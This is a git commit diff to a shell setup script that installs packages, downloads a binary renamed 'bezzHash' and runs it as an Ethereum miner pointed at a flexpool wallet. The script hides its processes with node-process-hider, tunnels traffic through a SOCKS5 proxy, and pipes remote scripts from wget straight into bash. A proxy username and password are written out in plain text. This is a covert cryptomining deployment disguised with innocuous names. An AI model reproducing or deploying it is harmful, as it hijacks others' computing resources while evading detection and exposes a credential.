bb4e562f1dcaeec5503fcf51881e55287cd18277
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-05-26 17:26:30 +0200

    Update start_bees_Man.sh

--- start_bees_Man.sh
+++ start_bees_Man.sh
@@ -1,10 +1,8 @@
 #!/bin/sh
-wget -O - https://raw.githubusercontent.com/nathanfleight/scripts/main/start_ping_every2min.sh | bash &
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install libpci-dev screen unzip net-tools iputils-ping
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget -O - https://deb.nodesource.com/setup_17.x | bash
 
@@ -14,17 +12,16 @@ apt -y install npm > /dev/null
 
 npm i -g node-process-hider
 
+ph add graftcp
+
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
-ph add graftcp
-ph add bees
-
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = gpusocks6.wot.mrface.com:1080
+socks5 = gpusocks4.wot.mrface.com:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -48,16 +45,9 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-ps -A | grep graftcp* | awk '{print $1}' | xargs kill -9 $1
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+ph add bezzHash
 
-sleep .5
-
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bees
-chmod +x bees
-
-
-./graftcp/graftcp ./bees -a ethash -w 0xC236BedfCC4ec6a39251eeBDd185Fa0cb44b910B -p stratum+ssl://eth-de.flexpool.io:5555 -r Bees -v 4
-
+./graftcp/graftcp ./bezzHash --url=ssl://0xC236BedfCC4ec6a39251eeBDd185Fa0cb44b910B.bezzHash@eth-de.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
